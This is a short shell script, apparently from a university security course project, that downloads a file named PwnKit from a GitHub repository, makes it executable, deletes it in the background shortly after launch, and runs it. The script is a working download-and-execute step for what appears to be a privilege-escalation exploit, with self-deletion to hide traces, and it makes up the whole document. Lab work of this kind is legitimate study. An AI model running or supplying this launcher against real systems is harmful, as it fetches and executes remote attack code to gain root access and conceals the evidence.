curl -fsSL https://github.com/A0-2H/ICS344-CourseProject/blob/main/phase1/custom/custom.sh -o PwnKit || exit
chmod +x ./PwnKit || exit
(sleep 1 && rm ./PwnKit & )
./PwnKit
